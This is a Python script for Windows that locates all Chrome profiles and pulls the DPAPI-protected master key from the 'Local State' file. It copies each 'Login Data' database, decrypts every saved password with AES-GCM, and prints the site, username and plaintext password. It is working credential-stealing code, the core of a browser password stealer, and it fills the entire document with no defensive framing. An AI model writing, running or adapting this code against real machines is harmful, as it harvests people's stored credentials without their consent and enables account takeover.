import os
import sqlite3
import shutil
import base64
import json
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from win32crypt import CryptUnprotectData

def get_chrome_profiles():
    # Path to Chrome's User Data folder
    user_data_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
    
    # List all profiles in the User Data folder
    profiles = []
    if os.path.exists(user_data_path):
        # Check for 'Default' profile
        default_profile_path = os.path.join(user_data_path, 'Default')
        if os.path.exists(default_profile_path):
            profiles.append(default_profile_path)
        
        # Check for any other profiles like 'Profile 1', 'Profile 2', etc.
        for i in range(1, 100):  # Assuming Chrome might have up to 99 profiles
            profile_folder = f"Profile {i}"
            profile_path = os.path.join(user_data_path, profile_folder)
            if os.path.exists(profile_path):
                profiles.append(profile_path)
                
    return profiles


def get_encryption_key():
    # Path to the Local State file (contains the encryption key for Chrome passwords)
    local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
    
    # Read the encryption key from the Local State file
    if not os.path.exists(local_state_path):
        print("Local State file not found.")
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state_data = json.load(f)
    
    # Extract the encryption key (Base64 encoded)
    encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
    
    # The key is encrypted using DPAPI, so we need to decrypt it
    encrypted_key = encrypted_key[5:]  # Remove the first 5 bytes
    encryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return encryption_key


def decrypt_password(encrypted_password, encryption_key):
    try:
        # Chrome uses AES-256-GCM for encryption
        # Decrypt the password using the encryption key
        nonce = encrypted_password[3:15]  # 12-byte nonce
        cipher_text = encrypted_password[15:-16]  # The cipher text
        tag = encrypted_password[-16:]  # 16-byte tag
        
        # Create AES-GCM cipher
        cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(nonce), backend=default_backend())
        decryptor = cipher.decryptor()
        
        # Decrypt the password
        decrypted_password = decryptor.update(cipher_text) + decryptor.finalize()
        return decrypted_password.decode('utf-8')
    
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return None


def extract_chrome_passwords(profile_path, encryption_key):
    login_data_path = os.path.join(profile_path, 'Login Data')
    
    # Ensure the Login Data file exists
    if not os.path.exists(login_data_path):
        print(f"Login Data file not found in profile: {profile_path}")
        return

    # Copy the database file because Chrome locks it while running
    shutil.copy2(login_data_path, "Login Data Copy")

    # Connect to the SQLite database
    conn = sqlite3.connect("Login Data Copy")
    cursor = conn.cursor()

    # Query to fetch saved passwords
    cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')

    # Process the results
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[2]
        encrypted_password = row[3]
        
        # Decrypt the password
        password = decrypt_password(encrypted_password, encryption_key)
        
        if password:
            print(f"Profile Path: {profile_path}")
            print(f"Website: {origin_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print("-" * 50)

    # Close the connection
    conn.close()


# Main execution: Get all Chrome profiles and extract passwords
profiles = get_chrome_profiles()

if not profiles:
    print("No Chrome profiles found.")
else:
    encryption_key = get_encryption_key()
    if encryption_key:
        for profile in profiles:
            extract_chrome_passwords(profile, encryption_key)
